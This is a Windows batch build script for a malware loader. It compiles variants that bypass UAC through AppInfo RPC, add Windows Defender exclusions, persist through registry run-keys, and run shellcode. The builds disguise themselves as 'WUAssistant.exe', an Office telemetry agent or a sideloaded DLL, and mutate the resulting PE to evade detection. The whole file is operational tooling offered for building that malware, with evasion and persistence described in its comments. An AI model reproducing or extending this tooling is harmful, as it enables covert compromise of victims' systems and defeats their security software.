@echo off
REM =============================================
REM  build.bat
REM
REM  Usage: build.bat                           (EXE loader)
REM         build.bat uac                       (EXE with AppInfo UAC bypass + WD exclusion)
REM         build.bat sideload                  (DLL sideload variant)
REM         build.bat sideload version.dll      (custom output name)
REM         build.bat sideload uac              (DLL with self-elevation + WD exclusion)
REM         build.bat sideload version.dll uac  (custom name + elevation)
REM
REM  UAC modules (UAC_BYPASS builds):
REM    Uac.c      - AppInfo RPC bypass (two-process, no manifest, no UAC dialog)
REM    Install.c  - Copy self to hidden path + run-key + WD exclusion
REM  Non-UAC:
REM    Persist.c  - Registry run-key persistence
REM =============================================

SET "VSTOOLS="
IF EXIST "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat" (
    SET "VSTOOLS=C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
)
IF EXIST "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" (
    SET "VSTOOLS=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
)
IF "%VSTOOLS%"=="" ( echo [!] VS not found. & exit /b 1 )
call "%VSTOOLS%" >nul 2>&1

REM --- Parse "uac" flag from any position ---
SET UAC=0
IF "%1"=="uac" SET UAC=1
IF "%2"=="uac" SET UAC=1
IF "%3"=="uac" SET UAC=1

REM --- Validate sideload prerequisites ---
IF "%1"=="sideload" IF NOT EXIST Sideload.h (
    echo [!] Sideload.h not found. Run: python SideloadGen.py ^<target.dll^>
    exit /b 1
)

REM --- Default: EXE build ---
REM     Persist.c is included for non-UAC builds (HKCU run-key, medium IL)
SET OUTNAME=WUAssistant.exe
SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Solana.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Persist.c
SET CFLAGS=/O1 /GS- /W0 /std:c17 /nologo
SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS kernel32.lib user32.lib

REM --- Optional extra flags from the web UI or caller (e.g. /DDEBUG) ---
IF DEFINED CFLAGS_EXTRA SET CFLAGS=%CFLAGS% %CFLAGS_EXTRA%

REM --- EXE UAC: two-process AppInfo bypass (no manifest) + WD exclusion ---
REM     /DUAC_BYPASS   → Uac.c + Install.c compiled in; no manifest; no UAC dialog.
REM     Medium-IL first run → AppInfo RPC → spawn elevated self → install → terminate.
REM     Elevated instance → copy to msoia.exe + WD exclusion + HKCU run-key → terminate.
REM     Subsequent boots: msoia.exe (medium IL) detects install path → skips bypass → runs shellcode.
IF NOT "%1"=="sideload" IF %UAC%==1 (
    SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Solana.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Uac.c Install.c
    SET "CFLAGS=/O1 /GS- /W0 /std:c17 /nologo /DUAC_BYPASS"
    SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS kernel32.lib user32.lib
    echo [*] UAC bypass enabled ^(AppInfo RPC, no manifest^)
    echo [*] WD exclusion enabled ^(AppInfo parent-spoof^)
    echo [*] Persist: HKCU run-key via Install.c
)

REM --- Override for sideload DLL build ---
IF "%1"=="sideload" (
    SET OUTNAME=sideload.dll
    SET CFILES=main.c Sideload.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Solana.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Persist.c
    SET "CFLAGS=/O1 /GS- /W0 /std:c17 /nologo /DBUILD_DLL"
    SET "LFLAGS=/DLL /NODEFAULTLIB /ENTRY:DllMain /SUBSYSTEM:WINDOWS kernel32.lib user32.lib"
    echo [*] Building DLL sideload variant...
    echo [*] Persist: HKCU run-key
)

REM --- DLL UAC: AppInfo bypass + WD exclusion + self-install ---
IF "%1"=="sideload" IF %UAC%==1 (
    SET CFILES=main.c Sideload.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Solana.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Uac.c Install.c
    SET "CFLAGS=/O1 /GS- /W0 /std:c17 /nologo /DBUILD_DLL /DREQUIRE_ELEVATION /DUAC_BYPASS"
    SET "LFLAGS=/DLL /NODEFAULTLIB /ENTRY:DllMain /SUBSYSTEM:WINDOWS kernel32.lib user32.lib"
    echo [*] UAC bypass enabled ^(AppInfo RPC^)
    echo [*] WD exclusion enabled
    echo [*] Persist: HKCU run-key via Install.c
)

REM --- Override output name (skip "uac" token) ---
IF "%1"=="sideload" IF NOT "%2"=="" IF NOT "%2"=="uac" SET "OUTNAME=%2"
IF "%1"=="sideload" IF "%2"=="uac" IF NOT "%3"=="" SET "OUTNAME=%3"

REM --- Compile version info resource ---
REM     EXE UAC: loader.rc (Office Telemetry Agent disguise + entropy dilution)
REM     DLL sideload: Sideload.rc (cloned from target DLL)
SET RESFILE=
IF NOT "%1"=="sideload" IF %UAC%==1 IF EXIST loader.rc (
    echo [*] Compiling loader.rc...
    rc /nologo loader.rc >nul
    IF %ERRORLEVEL% NEQ 0 ( echo [!] Resource compile failed & exit /b 1 )
    SET RESFILE=loader.res
)
IF "%1"=="sideload" IF EXIST Sideload.rc (
    echo [*] Compiling version info...
    rc /nologo Sideload.rc >nul
    IF %ERRORLEVEL% NEQ 0 ( echo [!] Resource compile failed & exit /b 1 )
    SET RESFILE=Sideload.res
)

echo [*] Assembling...
ml64 /c /nologo AsmStub.asm >nul
IF %ERRORLEVEL% NEQ 0 ( echo [!] ASM failed & exit /b 1 )

echo [*] Compiling...
cl %CFLAGS% %CFILES% AsmStub.obj %RESFILE% /Fe:%OUTNAME% /link %LFLAGS%
IF %ERRORLEVEL% NEQ 0 ( echo [!] Build failed & exit /b 1 )

echo [*] Mutating PE...
python Mutate.py %OUTNAME%

echo.
echo [+] Build: %OUTNAME%
for %%A in (%OUTNAME%) do echo [*] Size: %%~zA bytes
del /Q *.obj *.exp *.lib *.res 2>nul
echo [+] Done!
